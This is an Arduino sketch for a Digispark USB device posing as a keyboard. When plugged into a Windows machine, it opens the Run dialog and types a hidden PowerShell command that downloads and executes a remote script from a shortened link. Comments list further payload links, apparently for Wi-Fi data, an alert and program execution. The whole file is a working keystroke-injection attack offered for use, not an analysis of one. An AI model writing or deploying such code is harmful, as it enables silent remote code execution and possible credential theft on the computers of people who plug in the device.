#include "DigiKeyboard.h"

void winRun(const char* command){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT  ); // press the windows key
  DigiKeyboard.delay(300); // wait a second
  DigiKeyboard.println(command);
}

void downloadAndRun(){
  DigiKeyboard.delay(500);
  winRun("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HXQQOr');\"");
}

/// wifi : https://bit.ly/3HVeXwZ
/// alert: https://bit.ly/3sPIkL7
/// run_program: https://bit.ly/3HXQQOr
// powershell -W Hidden "IEX (New-Object Net.WebClient).DownloadString('https://bit.ly/3HVeXwZ');"
void setup() {
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(0);
  
  downloadAndRun(); 
}

void loop() {
  DigiKeyboard.update();
}
